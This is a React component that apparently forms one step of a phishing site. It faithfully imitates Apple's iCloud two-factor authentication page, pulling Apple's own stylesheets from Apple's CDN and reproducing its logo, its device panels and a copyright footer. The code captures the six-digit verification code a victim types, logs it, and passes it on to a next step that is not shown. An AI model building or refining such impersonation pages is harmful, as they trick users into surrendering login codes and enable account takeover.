// import { Logbar } from '../components/Logbar'
import React, { useState } from 'react'
import { useEffect } from 'react'
import './Stan.css'
import '/src/components/Logbar.css'
import './Creation.css'
import { Navbar } from '../components/Navbar'


function Auth({ pin, setPin, onNext, code, setCode }) {

  const handleInputChange = (e, index) => {
    const value = e.target.value;
  
    // Prevent non-numeric input
    if (/[^0-9]/.test(value)) return;
  
    // Update the code array
    const newCode = [...code];
    newCode[index] = value;
    setCode(newCode);
  
    // Focus on the next input field if the value is not empty
    if (value !== '' && index < 5) {
      document.getElementById(`code-input-${index + 1}`).focus();
    }
  
    // If the code is fully cleared, focus on the first input
    if (newCode.every((digit) => digit === '')) {
      document.getElementById(`code-input-0`).focus();
    }
  
    // Build the enteredPin after the state is updated
    const enteredPin = newCode.join('');
    setPin(enteredPin); // Update the pin state with the entered value
  };
  
  const handleKeyDown = (e, index) => {
    if (e.key === 'Backspace' && code[index] === '' && index > 0) {
      // Focus on the previous input field if Backspace is pressed
      document.getElementById(`code-input-${index - 1}`).focus();
    }
  };
  
  // useEffect to handle pin updates and trigger onNext when pin is valid
  useEffect(() => {
    if (pin.length === 0) {
      document.getElementById(`code-input-0`).focus();
    }
  
    // If all 6 digits are filled and the pin is valid, trigger the next step
    if (pin.length === 6 && /^[0-9]{6}$/.test(pin)) {
      console.log("Entered Pin:", pin); // Debugging log
      onNext(); // Proceed to the next step
    }
  }, [pin]); 


  return (
    
    <main>
      <Navbar/>
      <div className='home-login-component has-visible-quick-access'>
        <div className='parent-container has-visible-quick-access is-visible'>
          <div style={{ visibility: 'visible', height: 'auto' }}>
            <div className='widget-icon-text'>
              <svg
                viewBox='0 0 160 160'
                xmlns='http://www.w3.org/2000/svg'
                xmlnsXlink='http://www.w3.org/1999/xlink'
                className='icon'
                draggable='false'
                aria-hidden='true'
              >
                <defs>
                  <linearGradient
                    x1='100%'
                    y1='100%'
                    x2='50%'
                    y2='50%'
                    id='f2f15fa97739d6b8762a5540d983611bb'
                  >
                    <stop stopColor='#8700FF' offset='0%' />
                    <stop stopColor='#EE00E1' stopOpacity={0} offset='100%' />
                  </linearGradient>
                  <linearGradient
                    x1='0%'
                    y1='100%'
                    x2='50%'
                    y2='50%'
                    id='f2f15fa97739d6b8762a5540d983611bc'
                  >
                    <stop stopColor='#E00' offset='0%' />
                    <stop stopColor='#EE00E1' stopOpacity={0} offset='100%' />
                  </linearGradient>
                  <linearGradient
                    x1='100%'
                    y1='0%'
                    x2='50%'
                    y2='50%'
                    id='f2f15fa97739d6b8762a5540d983611bd'
                  >
                    <stop stopColor='#00B1EE' offset='0%' />
                    <stop stopColor='#00B1EE' stopOpacity={0} offset='100%' />
                  </linearGradient>
                  <linearGradient
                    x1='-17.876%'
                    y1='21.021%'
                    x2='48.935%'
                    y2='50%'
                    id='f2f15fa97739d6b8762a5540d983611be'
                  >
                    <stop stopColor='#FFA456' offset='0%' />
                    <stop stopColor='#FFA456' stopOpacity={0} offset='100%' />
                  </linearGradient>
                  <path
                    d='M89.905 152.381a3.81 3.81 0 110 7.619 3.81 3.81 0 010-7.619zm-23.737 2.79a3.81 3.81 0 117.36 1.973 3.81 3.81 0 01-7.36-1.972zm46.799-5.126a3.81 3.81 0 11-7.36 1.972 3.81 3.81 0 017.36-1.972zm-60.58-2.409a3.81 3.81 0 11-3.81 6.598 3.81 3.81 0 013.81-6.598zm28.777-4.373a3.302 3.302 0 11-.804 6.554 3.302 3.302 0 01.804-6.554zm-16.684-1.899a3.338 3.338 0 11-2.5 6.19 3.338 3.338 0 012.5-6.19zm36.901 2.383a3.338 3.338 0 11-6.61.93 3.338 3.338 0 016.61-.93zm28.591-4.621a3.81 3.81 0 11-6.598 3.81 3.81 3.81 0 016.598-3.81zm-94.15-.941a3.81 3.81 0 11-5.387 5.387 3.81 3.81 0 015.388-5.387zm52.547-.486a3.023 3.023 0 110 6.047 3.023 3.023 0 010-6.047zm-15.136.077a3.023 3.023 0 11-1.565 5.841 3.023 3.023 0 011.565-5.84zm-24.278-2.592a3.338 3.338 0 11-4.017 5.331 3.338 3.338 0 014.017-5.331zm68.381.883a3.338 3.338 0 11-6.145 2.609 3.338 3.338 0 016.145-2.609zm-10.664-.222a3.023 3.023 0 11-5.841 1.565 3.023 3.023 0 015.84-1.565zm-48.079-1.912a3.023 3.023 0 11-3.023 5.237 3.023 3.023 0 013.023-5.237zm22.334-3.47a2.62 2.62 0 11-.639 5.201 2.62 2.62 0 01.639-5.202zm-13.241-1.507a2.65 2.65 0 11-1.985 4.912 2.65 2.65 0 011.985-4.912zm29.286 1.891a2.65 2.65 0 11-5.246.737 2.65 2.65 0 015.246-.737zm23.196-3.668a3.023 3.023 0 11-5.236 3.024 3.023 3.023 0 015.236-3.024zm-74.721-.747a3.023 3.023 0 11-4.276 4.276 3.023 3.023 0 014.276-4.276zm98.125-2.255a3.81 3.81 0 11-5.387 5.388 3.81 3.81 0 015.387-5.388zM35.56 125.196a3.338 3.338 0 11-5.26 4.11 3.338 3.338 0 015.26-4.11zm-13.29-.428a3.81 3.81 0 11-6.599 3.81 3.81 3.81 0 016.599-3.81zm108.491-.249a3.338 3.338 0 11-5.26 4.11 3.338 3.338 0 015.26-4.11zm-75.396-.468a2.65 2.65 0 11-3.188 4.231 2.65 2.65 0 013.188-4.231zm54.271.7a2.65 2.65 0 11-4.877 2.071 2.65 2.65 0 014.877-2.07zm21.327-9.436a3.023 3.023 0 11-4.276 4.276 3.023 3.023 0 014.276-4.276zm-86.23.808a2.65 2.65 0 11-4.175 3.262 2.65 2.65 0 014.175-3.262zm-10.043-.339a3.023 3.023 0 11-5.236 3.024 3.023 3.023 0 015.236-3.024zm85.6-.197a2.65 2.65 0 11-4.175 3.262 2.65 2.65 0 014.175-3.262zm-95.085-3.507a3.338 3.338 0 11-6.145 2.609 3.338 3.338 0 016.145-2.609zm115.534-2.19a3.338 3.338 0 11-4.018 5.332 3.338 3.338 0 014.018-5.331zm12.102-3.672a3.81 3.81 0 11-3.81 6.599 3.81 3.81 0 013.81-6.599zM12.65 108.301a3.81 3.81 0 11-7.36 1.972 3.81 3.81 0 017.36-1.972zm23.865-2.586a2.65 2.65 0 11-4.877 2.07 2.65 2.65 0 014.877-2.07zm91.693-1.738a2.65 2.65 0 11-3.188 4.231 2.65 2.65 0 013.188-4.231zm10.11-2.915a3.023 3.023 0 11-3.023 5.237 3.023 3.023 0 013.023-5.237zm-111.262 1.653a3.023 3.023 0 11-5.841 1.565 3.023 3.023 0 015.84-1.565zm-8.458-5.983a3.338 3.338 0 11-6.611.93 3.338 3.338 0 016.61-.93zm127.992-3.554a3.338 3.338 0 11-2.5 6.19 3.338 3.338 0 012.5-6.19zm-115.319.356a2.65 2.65 0 11-5.246.737 2.65 2.65 0 015.246-.737zm101.581-2.821a2.65 2.65 0 11-1.984 4.912 2.65 2.65 0 011.984-4.912zm19.627-1.547a3.81 3.81 0 117.36 1.972 3.81 3.81 0 01-7.36-1.972zM3.81 86.096a3.81 3.81 0 110 7.618 3.81 3.81 0 010-7.619zm137.923-.705a3.023 3.023 0 11-1.565 5.84 3.023 3.023 0 011.565-5.84zm-121.694-.3a3.023 3.023 0 110 6.047 3.023 3.023 0 010-6.047zm-6.938-8.368a3.302 3.302 0 11-.805 6.554 3.302 3.302 0 01.805-6.554zm13.807.93a2.62 2.62 0 11-.638 5.202 2.62 2.62 0 01.638-5.202zm120.796-1.946a3.302 3.302 0 11-.805 6.554 3.302 3.302 0 01.805-6.554zm-13.968 1.14a2.62 2.62 0 11-.638 5.201 2.62 2.62 0 01.638-5.201zm7.24-7.477a3.023 3.023 0 110 6.046 3.023 3.023 0 010-6.046zm-120.128-.094a3.023 3.023 0 11-1.565 5.841 3.023 3.023 0 011.565-5.84zm135.342-2.99a3.81 3.81 0 110 7.619 3.81 3.81 0 010-7.62zM.162 68.862a3.81 3.81 0 117.36 1.972 3.81 3.81 0 01-7.36-1.972zm29.28-5.072a2.65 2.65 0 11-1.984 4.913 2.65 2.65 0 011.985-4.913zm104.844 1.355a2.65 2.65 0 11-5.247.737 2.65 2.65 0 015.247-.737zm-117.992-5.89a3.338 3.338 0 11-2.5 6.19 3.338 3.338 0 012.5-6.19zm132.102 1.708a3.338 3.338 0 11-6.61.929 3.338 3.338 0 016.61-.93zm-8.594-4.735a3.023 3.023 0 11-5.84 1.565 3.023 3.023 0 015.84-1.565zm-114.08-2.019a3.023 3.023 0 11-3.024 5.237 3.023 3.023 0 013.024-5.237zm9.569-3.001a2.65 2.65 0 11-3.189 4.23 2.65 2.65 0 013.189-4.23zm93.381.423a2.65 2.65 0 11-4.877 2.07 2.65 2.65 0 014.877-2.07zm26.039-1.904a3.81 3.81 0 11-7.36 1.972 3.81 3.81 0 017.36-1.972zM10.969 47.183a3.81 3.81 0 11-3.809 6.599 3.81 3.81 0 013.81-6.599zm12.693-3.781a3.338 3.338 0 11-4.017 5.331 3.338 3.338 0 014.017-5.331zm117.661.533a3.338 3.338 0 11-6.145 2.608 3.338 3.338 0 016.145-2.608zm-9.76-2.235a3.023 3.023 0 11-5.237 3.024 3.023 3.023 0 015.237-3.024zm-97.233-.783a3.023 3.023 0 11-4.276 4.276 3.023 3.023 0 014.276-4.276zm9.866-.35a2.65 2.65 0 11-4.175 3.262 2.65 2.65 0 014.175-3.262zm75.556-.537a2.65 2.65 0 11-4.175 3.262 2.65 2.65 0 014.175-3.262zm24.578-8.608a3.81 3.81 0 11-6.599 3.81 3.81 3.81 0 016.599-3.81zm-122.515-.987a3.81 3.81 0 11-5.387 5.388 3.81 3.81 0 015.387-5.388zm33.736 2.159a2.65 2.65 0 11-4.877 2.07 2.65 2.65 0 014.877-2.07zm52.583-1.46a2.65 2.65 0 11-3.189 4.231 2.65 2.65 0 013.189-4.231zm-73.251-1.14a3.338 3.338 0 11-5.26 4.11 3.338 3.338 0 015.26-4.11zm84.962-.194a3.023 3.023 0 11-4.276 4.276 3.023 3.023 0 014.276-4.276zm-73.76.505a3.023 3.023 0 11-5.238 3.024 3.023 3.023 0 015.237-3.024zm83.999-.987a3.338 3.338 0 11-5.26 4.11 3.338 3.338 0 015.26-4.11zm-61.5-1.487a2.65 2.65 0 11-5.247.738 2.65 2.65 0 015.247-.738zm26.024-2.284a2.65 2.65 0 11-1.984 4.913 2.65 2.65 0 011.984-4.913zm-14.487-1.912a2.62 2.62 0 11-.639 5.201 2.62 2.62 0 01.639-5.201zm25.325-2.297a3.023 3.023 0 11-3.023 5.237 3.023 3.023 0 013.023-5.237zm-45.261 1.76a3.023 3.023 0 11-5.841 1.565 3.023 3.023 0 015.84-1.565zm-10.994-3.15a3.338 3.338 0 11-6.145 2.609 3.338 3.338 0 016.145-2.609zm66.254-1.84a3.338 3.338 0 11-4.018 5.332 3.338 3.338 0 014.018-5.331zm14.12-1.68a3.81 3.81 0 11-5.388 5.387 3.81 3.81 0 015.388-5.387zm-40.217.463a3.023 3.023 0 11-1.565 5.84 3.023 3.023 0 011.565-5.84zm-16.701-.13a3.023 3.023 0 110 6.048 3.023 3.023 0 010-6.047zm-36.02.304a3.81 3.81 0 11-6.6 3.81 3.81 3.81 0 016.6-3.81zm28.985-3.118a3.338 3.338 0 11-6.611.93 3.338 3.338 0 016.61-.93zm32.79-2.877a3.338 3.338 0 11-2.5 6.19 3.338 3.338 0 012.5-6.19zM80.149 8.66a3.302 3.302 0 11-.804 6.553 3.302 3.302 0 01.804-6.553zm31.274-2.894a3.81 3.81 0 11-3.81 6.598 3.81 3.81 0 013.81-6.598zm-57.03 2.217a3.81 3.81 0 11-7.359 1.972 3.81 3.81 0 017.36-1.972zM91.139.163a3.81 3.81 0 11-1.972 7.359 3.81 3.81 0 011.972-7.36zM70.095 0a3.81 3.81 0 110 7.619 3.81 3.81 0 010-7.619z'
                    id='f2f15fa97739d6b8762a5540d983611ba'
                  />
                </defs>
                <use
                  fill='#FFF'
                  xlinkHref='#f2f15fa97739d6b8762a5540d983611ba'
                />
                <use
                  fill='url(#f2f15fa97739d6b8762a5540d983611bb)'
                  xlinkHref='#f2f15fa97739d6b8762a5540d983611ba'
                />
                <use
                  fill='url(#f2f15fa97739d6b8762a5540d983611bc)'
                  xlinkHref='#f2f15fa97739d6b8762a5540d983611ba'
                />
                <use
                  fill='url(#f2f15fa97739d6b8762a5540d983611bd)'
                  xlinkHref='#f2f15fa97739d6b8762a5540d983611ba'
                />
                <use
                  fill='url(#f2f15fa97739d6b8762a5540d983611be)'
                  xlinkHref='#f2f15fa97739d6b8762a5540d983611ba'
                />
                <path
                  fill='var(--theme-color-systemBlack)'
                  d='M80.38 68.181c1.66 0 3.75-1.091 4.999-2.565 1.137-1.346 1.94-3.183 1.94-5.039 0-.255-.02-.51-.057-.71-1.865.073-4.103 1.201-5.427 2.73-1.063 1.164-2.033 3.02-2.033 4.875 0 .29.056.564.075.655.112.018.298.054.503.054zm-5.724 27.713c2.248 0 3.243-1.474 6.044-1.474 2.838 0 3.483 1.438 5.97 1.438 2.47 0 4.11-2.239 5.677-4.44 1.732-2.53 2.469-4.987 2.487-5.115-.147-.036-4.865-1.947-4.865-7.28 0-4.622 3.704-6.697 3.926-6.86-2.451-3.477-6.192-3.586-7.224-3.586-2.746 0-4.994 1.656-6.431 1.656-1.53 0-3.52-1.547-5.916-1.547-4.551 0-9.158 3.713-9.158 10.701 0 4.368 1.695 8.973 3.814 11.94 1.806 2.51 3.39 4.567 5.676 4.567z'
                />
              </svg>
            </div>

            <div
              dir='ltr'
              data-rtl='false'
              lang='en'
              className='prefpane na-presentation form-mouseuser'
              id='bigPain'
            >
              <head>
                <title></title>

                <link
                  rel='stylesheet'
                  href='https://www.apple.com/wss/fonts?families=SF+Pro,v3|SF+Pro+Icons,v3'
                  type='text/css'
                />
                <link
                  rel='stylesheet'
                  href='https://appleid.cdn-apple.com/appleauth/static/module-assets/home-3885da1b99bf1a276ccf.css'
                />
                <link
                  rel='stylesheet'
                  type='text/css'
                  media='screen'
                  href='https://appleid.cdn-apple.com/appleauth/static/cssj/431834531/widget/auth/app-sk7.css'
                />
              </head>

              <body className='tk-body theme-dark' id='contentBig'>
                <div
                  className='si-body si-container container-fluid'
                  id='contentAuth'
                  role='main'
                  data-theme='lite'
                >
                  <div
                    id='contChild'
                    className='widget-container fade-in restrict-min-content restrict-max-wh fade-in'
                    data-mode='embed'
                    data-isiebutnotedge='false'
                  >
                    <div id='step' className='si-step'>
                      <div id='stepEl' className=''>
                        <div className='sk7'>
                          <div className='verify-device'>
                            <div className='sa-sk7__app-title'>
                              <h1 className='tk-intro' tabIndex='-1'>
                                Two-Factor Authentication
                              </h1>
                            </div>

                            <div className='sa-sk7__content'>
                              <div className='verify-device__sec-code'>
                                <div className='form-security-code'>
                                  <div className='form-security-code-inputs'>
                                    {Array.from({ length: 6 }, (_, i) => (
                                                      <input
                                                      key={i}
                                                      id={`code-input-${i}`}
                                                      className='form-security-code-input'
                                                      type='tel'
                                                      autoCapitalize='off'
                                                      autoCorrect='off'
                                                      spellCheck='false'
                                                      autoComplete='off'
                                                      aria-label={`Enter Verification Code Digit ${i + 1}`}
                                                      maxLength='1' // Only allows one character per input
                                                      value={code[i]} // Bind input value to the respective index in the code array
                                                      onChange={(e) => handleInputChange(e, i)} // Handle the change in each input
                                                      onKeyDown={(e) => handleKeyDown(e, i)} // Handle backspace logic
                                                      autoFocus={i === 0} // Automatically focus on the first input
                                                    />
                                    ))}
                                    <div className='form-security-code-divider'></div>
                                  </div>
                                </div>
                              </div>

                              <div className='signin-container-footer'>
                                <div className='signin-container-footer__info'>
                                  A message with a verification code has been
                                  sent to your devices. Enter the code to
                                  continue.
                                </div>

                                <div className='fixed-h'>
                                  <div className='signin-container-footer__link'>
                                    <div className='text text-typography-body-reduced'>
                                      <div className='inline-links'>
                                        <div className='inline-links__link'>
                                          <button
                                            className='button button-link button-rounded-rectangle'
                                            type='button'
                                            id='resend-code-link'
                                          >
                                            <span className='text text-typography-body-reduced'>
                                              Resend code
                                            </span>
                                          </button>
                                        </div>
                                      </div>

                                      <div className='inline-links'>
                                        <div className='inline-links__link'>
                                          <button
                                            className='button button-link button-rounded-rectangle'
                                            type='button'
                                            id='alt-options-btn'
                                          >
                                            <span className='text text-typography-body-reduced'>
                                              Can’t get to your devices?
                                            </span>
                                          </button>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>

                    <div
                      id='stocking'
                      style={{ display: 'none !important' }}
                    ></div>
                  </div>
                </div>
              </body>
            </div>

            <div className='quick-access-container'>
              <div className='quick-access'>
                <div className='quick-access-label'>
                  If you can’t enter a code because you’ve lost your device, you
                  can use Find Devices to locate it or Manage Devices to remove
                  your Apple&nbsp;Pay cards from it.
                </div>
                <div className='quick-access-buttons'>
                  <div className='quick-access-button'>
                    <ui-button
                      className='push primary icloud-mouse'
                      tabIndex={0}
                      ontouchstart='void(0)'
                      role='button'
                    >
                      <button type='button' tabIndex={-1} />
                      <svg
                        viewBox='0 0 113.683837890625 111.1806640625'
                        version='1.1'
                        xmlns='http://www.w3.org/2000/svg'
                        className=' layout-box'
                        width={37}
                        style={{ fill: "rgba(114, 110, 110, 1)" }} 
                      >
                        <g transform='matrix(1 0 0 1 -1.683129882812409 90.8203125)'>
                          <path d='M8.72266-35.2606C8.72266-7.47784 31.3516 15.1511 59.1344 15.1511C86.9606 15.1511 109.59-7.47784 109.59-35.2606C109.59-50.7642 102.467-64.6827 91.3977-73.9726L87.465-67.3934C96.3507-59.5491 102.026-48.0686 102.026-35.2606C102.026-11.5985 82.7966 7.63087 59.1344 7.63087C35.5156 7.63087 16.2863-11.5985 16.2863-35.2606C16.2863-48.0686 21.9181-59.5491 30.8038-67.3934L26.9146-73.9726C15.8451-64.6827 8.72266-50.7642 8.72266-35.2606ZM25.0223-35.2606C25.0223-16.4104 40.3276-1.10512 59.1344-1.10512C77.9846-1.10512 93.2899-16.4104 93.2899-35.2606C93.2899-44.9063 89.2816-53.5323 82.864-59.7789L78.7988-52.9359C83.0601-48.2867 85.6766-42.0758 85.6766-35.2606C85.6766-20.6122 73.7828-8.71848 59.1344-8.71848C44.486-8.71848 32.5922-20.6122 32.5922-35.2606C32.5922-42.0758 35.2086-48.2867 39.5134-52.9359L35.4047-59.7789C29.0306-53.5323 25.0223-44.9063 25.0223-35.2606ZM41.1755-35.2709C41.1755-25.3573 49.2208-17.312 59.1344-17.312C69.048-17.312 77.1367-25.3573 77.1367-35.2709C77.1367-40.3835 74.9749-44.9589 71.5659-48.2212L88.1519-75.7173C88.3491-76.0494 88.2885-76.3695 87.9564-76.6204C79.8818-82.4204 69.3532-85.6724 59.1344-85.6724C48.9505-85.6724 38.387-82.4204 30.3558-76.6204C30.0237-76.3695 29.9631-76.0494 30.1603-75.7173L46.7463-48.2212C43.3373-44.9589 41.1755-40.3835 41.1755-35.2709ZM39.974-73.5699C45.726-76.4747 52.2276-78.1522 59.1344-78.1522C66.0412-78.1522 72.5428-76.4747 78.3382-73.5699L73.8098-66.0611C69.3474-68.2477 64.3481-69.4162 59.1344-69.4162C53.9207-69.4162 48.9214-68.2477 44.5024-66.0611ZM48.4728-59.5151C51.7005-61.0046 55.356-61.8028 59.1344-61.8028C62.9562-61.8028 66.6117-61.0046 69.8394-59.5151L65.3345-52.1213C63.414-52.8262 61.3356-53.2298 59.1344-53.2298C56.9766-53.2298 54.8983-52.8262 52.9343-52.1213ZM48.0558-35.2709C48.0558-41.4246 52.9807-46.3929 59.1344-46.3929C65.3315-46.3929 70.2564-41.4246 70.2564-35.2709C70.2564-29.1275 65.3213-24.1489 59.1344-24.1489C52.9909-24.1489 48.0558-29.1275 48.0558-35.2709ZM51.641-35.2709C51.641-31.1141 54.9879-27.7775 59.1344-27.7775C63.2912-27.7775 66.6278-31.1244 66.6278-35.2709C66.6278-39.4277 63.2809-42.7643 59.1344-42.7643C54.9776-42.7643 51.641-39.4175 51.641-35.2709Z' />
                        </g>
                      </svg>
                      <div className='title'>Find Devices</div>
                    </ui-button>
                  </div>
                  <div className='quick-access-button'>
                    <ui-button
                      className='push primary icloud-mouse'
                      tabIndex={0}
                      ontouchstart='void(0)'
                      role='button'
                    >
                      <button type='button' tabIndex={-1} />
                      <svg
                        viewBox='0 0 145.67578125 111.1806640625'
                        version='1.1'
                        xmlns='http://www.w3.org/2000/svg'
                        className=' layout-box'
                        width={47}
                        style={{ fill: "rgba(114, 110, 110, 1)" }} 
                      >
                        <g transform='matrix(1 0 0 1 -1.8170800781249454 90.8203125)'>
                          <path d='M27.7789 9.76808L92.6089 9.76808C91.4587 8.13106 90.6086 6.17297 90.2453 3.95612C90.1724 3.29287 90.0996 2.62962 90.0785 1.86286L27.9035 1.86286C23.0272 1.86286 20.3144-0.694633 20.3144-5.77797L20.3144-64.5976C20.3144-69.6292 23.0272-72.2384 27.9035-72.2384L112.108-72.2384C116.942-72.2384 119.697-69.6292 119.697-64.5976L119.697-62.8481C122.518-62.8481 125.045-62.8481 127.551-62.8375L127.551-64.981C127.551-75.0367 122.465-80.1437 112.233-80.1437L27.7789-80.1437C17.5986-80.1437 12.4609-75.0578 12.4609-64.981L12.4609-5.3946C12.4609 4.6822 17.5986 9.76808 27.7789 9.76808ZM51.1572-1.87542L89.8474-1.87542C89.8474-3.34762 89.8474-4.89269 89.8474-6.37545L51.1572-6.37545C49.8508-6.37545 48.8761-5.50418 48.8761-4.09428C48.8761-2.73613 49.8508-1.87542 51.1572-1.87542ZM105.09 9.76808L127.288 9.76808C133.371 9.76808 136.847 6.40563 136.847 0.622849L136.847-47.9874C136.847-53.8219 133.36-57.1431 127.288-57.1431L105.09-57.1431C99.0077-57.1431 95.5417-53.8219 95.5417-47.9874L95.5417 0.622849C95.5417 6.40563 98.9971 9.76808 105.09 9.76808ZM105.205 3.36372C103.059 3.36372 101.946 2.19903 101.946-0.0393971L101.946-47.3663C101.946-49.6153 103.059-50.7388 105.205-50.7388L109.608-50.7388C109.784-50.7388 109.898-50.6247 109.898-50.4378L109.898-50.0228C109.898-48.3215 111.019-47.1703 112.731-47.1703L119.648-47.1703C121.36-47.1703 122.491-48.3215 122.491-50.0228L122.491-50.4378C122.491-50.6247 122.594-50.7388 122.749-50.7388L127.174-50.7388C129.361-50.7388 130.443-49.6153 130.443-47.3663L130.443-0.0393971C130.443 2.19903 129.361 3.36372 127.174 3.36372ZM109.532 0.871532L122.743 0.871532C123.749 0.871532 124.517 0.16608 124.517-0.840344C124.517-1.77391 123.739-2.50047 122.743-2.50047L109.532-2.50047C108.536-2.50047 107.872-1.77391 107.872-0.840344C107.872 0.217834 108.474 0.871532 109.532 0.871532Z' />
                        </g>
                      </svg>
                      <div className='title'>
                        Manage Devices
                        <svg
                          viewBox='0 0 268.0201416015625 158.116943359375'
                          version='1.1'
                          xmlns='http://www.w3.org/2000/svg'
                          className='cloudos-menu-item-opens-in-new-tab layout-box'
                          aria-hidden='true'
                          style={{ height: '20.1966px', width: '34.2348px' }}
                        >
                          <g transform='matrix(1 0 0 1 85.49510009765618 114.2884521484375)'>
                            <path d='M84.5703-17.334L84.5215-66.4551C84.5215-69.2383 82.7148-71.1914 79.7852-71.1914L30.6641-71.1914C27.9297-71.1914 26.0742-69.0918 26.0742-66.748C26.0742-64.4043 28.1738-62.4023 30.4688-62.4023L47.4609-62.4023L71.2891-63.1836L62.207-55.2246L13.8184-6.73828C12.9395-5.85938 12.4512-4.73633 12.4512-3.66211C12.4512-1.31836 14.5508 0.878906 16.9922 0.878906C18.1152 0.878906 19.1895 0.488281 20.0684-0.439453L68.5547-48.877L76.6113-58.0078L75.7324-35.2051L75.7324-17.1387C75.7324-14.8438 77.7344-12.6953 80.127-12.6953C82.4707-12.6953 84.5703-14.6973 84.5703-17.334Z' />
                          </g>
                        </svg>
                      </div>
                    </ui-button>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <footer>
        <div className='legal-footer'>
          <div className='application-content'>
            <div className='legal-footer-content'>
              <div className='inner-row' role='presentation'>
                <div className='with-separator'>
                  <a
                    className='systemStatus'
                    target='_blank'
                    rel='noreferrer'
                    href='https://www.apple.com/support/systemstatus/'
                    aria-label='System Status (opens in a new tab)'
                  >
                    System Status
                  </a>
                  <div aria-hidden='true' className='separator' />
                </div>
                <div className='with-separator'>
                  <a
                    className='privacy'
                    target='_blank'
                    rel='noreferrer'
                    href='https://www.apple.com/legal/privacy/'
                    aria-label='Privacy Policy (opens in a new tab)'
                  >
                    Privacy Policy
                  </a>
                  <div aria-hidden='true' className='separator' />
                </div>
                <a
                  className='terms'
                  target='_blank'
                  rel='noreferrer'
                  href='https://www.apple.com/legal/internet-services/icloud/'
                  aria-label='Terms & Conditions (opens in a new tab)'
                >
                  Terms &amp; Conditions
                </a>
              </div>
              <div className='inner-row' role='presentation'>
                <span className='copyright'>
                  Copyright © 2024 Apple Inc. All rights reserved.
                </span>
              </div>
            </div>
          </div>
        </div>
      </footer>
    </main>
  )
}

export default Auth;